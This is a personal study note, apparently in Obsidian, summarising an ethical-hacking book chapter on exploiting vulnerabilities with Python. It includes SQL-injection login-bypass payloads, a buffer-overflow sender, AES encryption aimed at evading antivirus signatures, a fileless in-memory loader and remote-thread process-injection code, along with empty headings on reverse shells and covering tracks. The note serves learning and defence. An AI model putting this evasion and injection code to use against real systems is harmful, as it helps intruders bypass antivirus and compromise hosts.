
---
[[Hacker - Hack The System - The Ethical Python Hacking Guide - Study Contents]]
[Previous Chapter](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%201.md)

[[Hacker - Hack The System - The Ethical Python Hacking Guide.pdf]]
# Chapter 2: The Art Of Exploiting Vulnerabilities
Before utilising vulnerability exploits, it is very important to understand the landscape, and the various weaknesses that can exist within a system.

Vulnerabilities can range from the following examples:
- Misconfigurations
- Buffer Overflows
- Arbitrary Code Execution

Dissecting vulnerabilities serves as the map to explore their nature. Classifications like SQL Injections, Cross Site-Scripting (XSS), and Cross-Site Request Forgery (CSRF) highlighting the way forward. These classifications not only facilitate a structured approach to vulnerability exploitation but also help in the developing structured targeted defences against the attacks.
# Simple Code Snippets
[Simple SQL Injection](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%202.md###%20Simple%20SQL%20Injection)
[Simple SQL-Injection Exploit](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%202.md###%20Simple%20SQL-Injection%20Exploit)
[Simple Vulnerability Database Scraper](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%202.md###%20Simple%20Vulnerability%20Database%20Scraper)
[Simple Buffer Overflow](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%202.md###%20Simple%20Buffer%20Overflow)
[Simple Encrypted Payload Signature-Based Detection Evasion](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%202.md###%20Simple%20Encrypted%20Payload%20Signature-Based%20Detection%20Evasion)
[Memory Execution](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%202.md###%20Memory%20Execution)
[Simple Code Injection](Hacker%20-%20Hack%20The%20System%20-%20The%20Ethical%20Python%20Hacking%20Guide%20-%20Chapter%202.md###%20Simple%20Code%20Injection)

---
# Python: The Ethical Hacker's Blade
In cybersecurity, Python stands out as a versatile tool, honed by innovation and supported by a vast community. Its clear syntax and robust libraries empower ethical hackers to craft sophisticated exploits, swiftly adapting to evolving vulnerabilities and testing system resilience with precision.

The following is an example of an SQL injection vulnerability, and a python script which could be engineered to automated injecting malicious payloads into the web application's inputs to potentially reveal sensitive data.
### Simple SQL Injection
```python
import requests

target_url = "https://example.com/vulnerable-page"

payload = {"username":"admin'--","password":"irrelevant"} # Request Body
response = requests.post(target_url, data=payload)

# Example Success
if "Welcome back, admin" in response.text:
	print("SQL Injection Successful: Managed to bypass authentication")w 
```

The script is simplistic but presents the power in which python Python has in the hands of the ethical hacker, it transforms abstract vulnerabilities into "tangible proofs of concept" demonstrating the importance of implementing robust countermeasures to facilitate any potential impact.
### Explaining The Payload
The payload `username:'admin'--password:irrelevant` .
## The Ethical Hacker's Creed
The creed of the Ethical hacker is that; with great knowledge comes great responsibility. An unspoken oath for those who dedicate themselves in the pursuit between the two boundaries that delineate between offensive and defensive security.

It is important that for the Ethical Hacker to delve into the vast terrain of the digital world, with the clear purpose to identify vulnerabilities, and "not [exploiting] for personal gain."

Exploiting at its heart is an art form, a testament to those who strive through their ingenuity to map the digital landscape and make it a safer domain. The constant tug-of-war between cyber security professionals and the malicious actors who pose as their adversaries, present a dynamic, constantly evolving and shifting battleground. A place "where knowledge, ethics and technical prowess converge."

Ethical hackers do not merely exploit, they master the art. Through each vulnerability that is revealed and addresses, contributes to the resilience in the digital infrastructure, every flaw can be improved and fixed, and ensuring the landscape remains robust in light of new and evolving threats.

---
# The Fabric of Vulnerabilities
The core of a vulnerability is that it represents a flaw or weakness in a system's design, implementation, operation, or management that can be exploited to violate its security policy.

The flaw could be as simple as a software bug or as complex as a misconfigured network device. Understanding vulnerabilities requires a methodical approach, which entails examining the system from multiple perspectives.

The perspectives to be analysed being:
- Technical - SQL Injection or XSS attack possibilities
- Operational - Software bugs or flaws in the system design
- Human - Software Engineering (Phishing Attacks)

Vulnerabilities are able to be categorised into various types, each having unique characteristics and "exploitation methodologies." 

Some examples of vulnerability types are as follows:
- Software Vulnerabilities
- Network Vulnerabilities
- Hardware Vulnerabilities
- Human Factors
## Software Vulnerabilities
Software vulnerabilities are flaws in "software applications or operating systems." 

Examples of such include "buffer overflows, SQL Injections," and XSS (Cross-Site Scripting) attacks. These exploits which "[execute] arbitrary code, access sensitive information, or bypass authentication mechanisms," weaknesses in which an ethical hacker can pinpoint.
## Network Vulnerabilities
Network Vulnerabilities, involve weaknesses in network protocols, or configurations. These flaws, can be exploited by the Ethical Hacker, to "intercept, manipulate, or disrupt network traffic."

Some examples of Network Vulnerabilities include "session hijacking," MiTM (Man-in-The-Middle) attacks, and "DNS spoofing."
## Hardware Vulnerabilities
Hardware vulnerabilities "stem from physical" or design flaws, in hardware components. 

Examples of Hardware Vulnerabilities include [Spectre and Meltdown](https://meltdownattack.com/) which demonstrate "exploiting speculative execution in CPUs to leak sensitive information"
## Human Factors
Human factors, include social engineering techniques, phishing emails, and poor password practices, which can be exploited by the Ethical Hacker to exploit vulnerabilities and gain access unauthorised to systems.

---
# Exploitation Techniques: The Hacker's Craft
Exploits, are "tools and techniques" designed to leverage specific vulnerabilities to achieve a desired outcome, which could be one or more of the following "unauthorised access, data exfiltration, or denial of server."

Understanding the type of exploit is crucial for an ethical hacker as it not only "aids in defending them but also in anticipating potential future threats."

Some type of exploits include: 
- Remote Code Execution (RCE)
- Denial of Service (DoS) and Distributed Denial of Service (DDoS)
- Privilege Escalation
- Injection Attacks
## Remote Code Execution (RCE)
"This type of exploit allows an attacker to run arbitrary code on a target system from a remote location, often resulting in full system compromise."
## Denial of Service (DoS) & Distributed Denial of Service (DDoS)
"These attacks aim to make a system or network resource unavailable to its intended users, often by overwhelming it with traffic from one or more sources."
## Privilege Escalation
This exploit "allows an attacker to gain elevated access to resources that are normally protected from an application or user, thereby granting abilities beyond what was intended."
## Injection Attacks
"These involve injecting malicious code into a program or query, with SQL injection and Cross-Site Scripting (XSS) being among the most prevalent forms."

---
# Python Scripts: Sharpening the Hacker's Tools
### Simple SQL-Injection Exploit
```python
import requests

def test_sql_injection(url):
	payload = "'OR'1'='1"
	full_url = f"{url}?username=admin&password={payload}"
	response = requests.get(full_url)

	# Example Response
	if "logged in as admin" in response.text:
		print(f"SQL Injection successful on {url}")
	else:
		print(f"SQL Injection unsuccessful on {url}")

# Example Usage
test_sql_injection("https://example.com/login")
```

This Python script automates the process of testing a URL for SQL Injection vulnerabilities by utilising a login's lack of input sanitisation by sending a payload that "manipulates the underlying SQL query."

Scripts like these begin to "highlight the practical application of theoretical knowledge" by exploring through practical application of an SQL injection, using the Python to demonstrating an exploit, converging an understanding of vulnerabilities, to understanding the practicalities of defending against them.
## Ethical Implications and the Path Forward
Ethical hackers must understand that their knowledge of exploits and vulnerabilities "serves as a dual-edged sword" utilising their knowledge for the purposes of defence, and the bolstering of security, while being careful not to cross "into the worlds of authorised intrusion." Which can have legal consequences, such as violating the [Computer Misuse Act](https://www.legislation.gov.uk/ukpga/2006/48/part/5/crossheading/computer-misuse).

---
# Finding Exploits in Public Databases
Public exploit databases, serve as central collection and "dissemination of information" these databases are invaluable to the ethical hacker as they contain entries on individual vulnerabilities found and each entry can contain details such as a description of the weakness that was found, "its potential impact, how it can be exploited, and in some cases, remediation steps or patches." They benefit the ethical hacker by allowing them to "quickly gather detailed information on specific vulnerabilities".

Public exploit databases include the following:
- National Vulnerability Database (NVD)
- Exploit Database
- MITRE's CVE

The CVE identifier is central to the public exploit databases, it stands for Common Vulnerabilities and Exposure (CVE) system, which is a [standardised identifier](https://www.cve.org/About/History) for vulnerabilities.

Mastery of Advanced Search Features, and being able to effectively utilise the "search functionalities within these databases" which enable the ethical hacker to filter through the vast collection of vulnerabilities. By utilising "advanced search parameters, such as software vendors, vulnerability type, and date range, hackers can hone in on relevant vulnerabilities [with accuracy] and precision."
## Python Scripts: Automating the Hunt
Python streamlines, what in the past, was a " laborious task of sifting through public databases for relevant exploits" with it's vast amount of publicly available or built-in libraries which can be utilised by the ethical hacker in this endeavour. 
### Simple Vulnerability Database Scraper
```python
import requests
from bs4 import BeautifulSoup

def search_exploit_db(software_name):
	search_url = f"https://exploit-db.com/?q={software_name}"
	response = requests.get(search_url)

	# Example Response Handling
	if response.status_code == 200:
		soup = BeautifulSoup(response.text, 'html.parser')
		exploits = soup.find_all('td',class_="description")
		for exploit in exploits:
			title = exploit.find('a').text.strip()
			link = 'https://exploit-db.com'+exploit.find('a')['href']
			print(f"-------------\nFound Exploit:\n{title}\n{link}\n-------------")
	else:
		print("Failed to query Exploit Database")
```

This script is an example of how Python can be utilised to automate the search for exploit through public vulnerability databases, which "drastically reduces the time and effect required" by the Ethical Hacker. The software name is inputted, and the script queries the Exploit Database, and retrieves a "list of related exploits each with a title, and a link for further reading and exploration."
## Ways I noticed to improve this script
I noticed some ways in which the script above could be improved, there are some of the ways I realised:
### Vulnerability Database Array
If failure to find result in one site, search another if successfully, then no need to search any others.
### Further exploration
Program, could be automated e.g. scraping the vulnerability databases, for the data from the retrieved list of related vulnerabilities and parse the HTML with BeautifulSoup, providing flexibility for further configurations.
## Ethical Considerations and Responsible Disclosure
By indiscriminately exposing the "public exploit databases" into the public domain, this not only benefit cybersecurity professionals, dedicated to defending but also malicious actors, as it exposes vulnerabilities to both sides. Ethical Hackers must walk the tight rope in this case and ensure that their actions do not inadvertently help the continuation of cyber threats.
### Response Disclosure
"A cornerstone of ethical hacking." While exciting to discover new vulnerabilities or exploits, it is vital that Ethical Hackers follow the established standardised protocols for handling a new discovery, and reporting these findings accordingly to their "affected vendors" to allow them time to fix the exploit, so that it cannot be utilised against them by threats. As stated in the Ethical Hacker's creed it is the ethical hacker's job to discover and strengthen the digital landscape through defensive and not utilise their knowledge for "personal gain."

---
# The Anatomy of an Exploit
The book describes an Exploit as "a piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability to cause unintended or unanticipated behaviour" thus 'exploiting' the system.
## Python for Exploit Development
"The following illustrates a basic Python script designed to exploit a hypothetical buffer overflow vulnerability in a web application."
### Simple Buffer Overflow
```python
import socket

target_host = '10.0.0.1'
target_port = 80

buffer = "A"*1024 # Overflowing the buffer

# Example Usage
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_host,target_port))

	s.send(buffer.encode())
	print("Exploit sent successfully.")
except Exception as e:
	print(f"Error sending Exploit: {e}")
finally:
	s.close()
```

The script above shows a simple scenario where a buffer overflow vulnerability is exploited, by sending an "over sided amount of data to overflow the target application's buffer." It is fundamental principles like these which "pave the way for more complex and nuanced exploit development."

I was not fully aware prior to reading this section about the full extent of a buffer overflow, which is demonstrated in this video [[Buffer Overflows - CompTIA Security+]] quite well.
## Ethical Application and Legal Framework
Despite the creation of exploits being imperative to penetration testing, and ethical hacking, it is a delicate balance when navigating the legal landscape.
### Permission
Always obtain through explicit permission from the rightful owners or "administrators of the target system prior to testing"
### Responsible Disclosure
Vulnerabilities discovered should be "responsibly disclosed to the vender" with a clear line of communication, allowing for fixes and patches to be implemented before public announcement.

The book continues to state the following which is a nice anecdote but has no substance of knowledge to deprive.

"Writing basic exploits with Python serves as a gateway to the broader domain of cybersecurity and ethical hacking. It equips aspiring cyber security professionals with the knowledge, [tools,] and skills to test systems, identify vulnerabilities "

---
# Advanced Payload Crafting
This section ventures into the "strategies and methodologies" which "underpin the creation of such payloads."
## Exploring the Payload Horizon
Payloads are "decisive components of an exploit" that can contain data and information which leverages a vulnerability.

Advanced Payload crafting involves surpassing the basics known in exploiting a vulnerability involving "meticulous assembly of code" which can evade "**detection**, **maintain persistence**, and **provide deep access or control over the target system**."
### Stealth Techniques
Advanced Payloads are designed with stealth in mind, using employing various methods to avoid detection by "antivirus software, and IDS' (Intrusion Detection Systems)". 

A few methods specified in the book that are utilised in stealth for advanced payloads include the following:
- encrypting the payload
- obfuscating the code
- employing polymorphic and metamorphic techniques

The purpose of the last one is to "change the payload's signature without altering its functionality."
### Persistence
This process ensures that the payload "remains active, or can be reactivated even after a system reboot or update" which it critical in "maintaining access" to the target system. 

Some techniques the book specifies in relation to *Persistence* are as follows:
- Registry Modification
- Scheduled Tasks
- Exploiting System Services
## Leveraging Python for Sophistication
"Python's extensive standard library and the plethora of third modules available make it an excellent tool for developing advanced payloads." Like the one presented below which demonstrates using Python for "basic encryption to evade signature-based detection."
### Simple Encrypted Payload Signature-Based Detection Evasion
```python
from Crypto.Cipher import AES
import base64

# Secret Key used for Encryption/Decryption
secret_key = "Secret_Key"

# Initalisation Vector
iv = "This is an IV456"

# Encryption
def encrypt_message(message):
	obj = AES.new(secret_key, AES.MODE_CFB, iv)
	return base64.b64encode(obj.encrypt(message))

# Example Usage
payload = "malicious_code"
# Encrypting Payload
encrypted_payload = encrypt_message(payload.encode())
print(f"Encrypted Payload: {encrypted_payload}")
```
The example above is a simplistic example of encrypting a payload to avoid signature-based detection.
## Ethical Crafting and Deployment
Ethical Hackers and Cybersecurity professionals must walk the tightrope between harnessing their knowledge and capabilities for defence and not to be swayed into to the seductive thrall of potential misuse, breaking the creed of the Ethical Hacker by utilising their skills for personal gain.
### Consent and Legal Compliance
Explicit written, or digitally emailed consent should be given. Payloads deployed should only be within the agreed upon legal and ethical boundaries that the Ethical Hacker, obtained permission from the first-party. The process of explicit consent must be done for all parties involved and ensuring the actions performed remain within the legal "frameworks and standards" in practice.
### Minimalisation of Harm
It is important that the Ethical Hacker's actions do not exceed necessary harm, and as a result do not cause "harm or disruptions to systems, services or individuals" in which they were not given permission to do so. This involves the careful planning and deployment of payloads, immediately assessing and "reporting any discovered vulnerabilities to the appropriate parties for remediation."
## Designing Stealthy Payloads
Obfuscation is a critical tactic employed in the toolbox of the Ethical Hacker. The deliberate complication of a payload's code to "obscure its true purpose from analysis, both manual and automated."
### Code Obfuscation with Python
Python is versatile and offers simplicity, offering a unique advantage in crafting obfuscated code and payloads. Techniques like **variable name mangling**, **dynamic execution**, and the **use of encoding schemes** can "significantly alter the appearance of code" without changing the code's execution behaviour. "For instance employing **base64** encoding on a critical section of the payload and then *decoding it at runtime*, can evade detection mechanisms for specific signatures."
## Stealth Through Polymorphism
Polymorphism utilised in Cyber Security refers to the ability of a payload to "alter its code or signature between instances." This attribute is invaluable when evading signature-based and heuristic (rules of thumb) analysis techniques which "rely on recognising known patterns."
### Implementing Polymorphic Payloads in Python
Simple approach to achieving polymorphism in python is the usage of encrypted payloads, with "*dynamically generated keys*. Each instance of the payload encrypts its logic using a unique key." Thus ensuring that no two instances are the same (in regards to their signature). Upon execution, the payload decrypts in memory therefore rendering static analysis ineffective.

---
# Evasion Techniques
Furthermore obfuscation, and polymorphism are not the only ways to design stealthy payloads which require a comprehensive and thorough understanding of the techniques employed by antivirus' and IDS (Intrusion Detection Systems). Knowledge which allows for incorporation of evasion tactics "that specifically target the weaknesses or blind spots" of specific relevant systems.
### Memory Execution
A potent evasion technique is executing the payload entirely in memory. Such tactic is known as *fileless malware*. Python can be utilised to facilitate this, "through reflective loading of code, where the payload is injected into the memory space of an **[already]** running process without touching the disk." This method significantly reduces the payload's visibility to traditional antivirus solutions, which monitor for *file system changes*.
### Simple Memory Execution
```python
import ctypes
import base64

encrypted_dll_data = b"SGVsbG8gV29ybGQ="
dll_data = base64.b64decode(encrypted_dll_data)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
dll_addr = kernel32.VirtualAlloc(None, len(dll_data), 0x3000, 0x40)
if not dll_addr: raise ctypes.WinError(ctypes.get_last_error())

kernel32.RtlMoveMemory(ctypes.c_void_p(dll_addr), dll_data, len(dll_data))
thread_handle = kernel32.CreateThread(None, 0, ctypes.c_void_p(dll_addr), None, 0, ctypes.byref(ctypes.c_ulong(0)))
if not thread_handle: raise ctypes.WinError(ctypes.get_last_error())

kernel32.WaitForSingleObject(thread_handle, -1)
kernel32.VirtualFree(dll_addr, 0, 0x8000)
kernel32.CloseHandle(thread_handle)

print("DLL data copied to memory and thread executed.")
```
This code snippet presents an oversimplified method of "loading a DLL into memory, and executing it" which bypasses disk-based scanning mechanisms.

Designing stealthy payloads demonstrates the sophisticated mix of technical ability and strategic foresight. Demanding not only a mastery of the principles of **programming** and **cybersecurity** but also a visionary/out-of-box approach to outsmarting existing defence mechanisms, as defences continue to evolve strategies, and tools, the ethical hacker must be able to refine their craft, and techniques ensuring the payloads remain as shadows. **Only seen by those who know where to look**.
## Bypassing Antivirus Solutions
To beat an enemy one must first understand their *tactics and strategies*. 

Antivirus solutions primarily use signature-based, heuristic and behavioural analysis to discover threats.
### Signature Evasion

### Heuristic & Behavioural Evasion

## Advanced Evasion Techniques
### Code Injection

### Simple Code Injection
```python
import ctypes
target_process = "app.exe"
malicious_code = b"\x90\x90\x90\xCC" # NOP sled followed by shellcode
import psutil

for proc in psutil.process_iter(['name', 'pid']):
 if proc.info['name'].lower() == target_process.lower(): target_process_pid = proc.info['pid']; break
 
# Open handle to target process
h_process = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, target_process_pid)

# Allocate memory in target process
remote_memory = ctypes.windll.kernel32.VirtualAllocEx(h_process, None, len(malicious_code), 0x3000, 0x40)

# Write the malicious code to the allocated memory
ctypes.windll.kernel32.WriteProcessMemory(h_process, remote_memory, malicious_code, len(malicious_code), None)

# Create a remote thread in the target process that starts at the malicious code
ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, remote_memory, None, 0, None)
ctypes.windll.kernel32.CloseHandle(h_process)
```
## Countermeasures and Ethical Considerations

---
# The Art of In-Memory Execution

## Techniques for Memory-Based Payload Execution

## Post-Exploitation with Python

## Spawning Reverse Shells

## Clearing Logs and Covering Tracks


---
# Automating the Gathering of Sensitive Information

## Crafting Python Scripts for Data Collection

## Utilising APIs for Data Aggregation


---
# Automating Social Engineering Data Collection


---
# Spawning Reverse Shells

## Python and the Art of Reverse Shell Creation

## Ethical Considerations and Defensive Measures

## Engendering Resilience through Knowledge

## Clearing Logs and Covering Tracks


---
# Python for Log Management

## Ethical Considerations and Transparency

## Defensive Measures

---
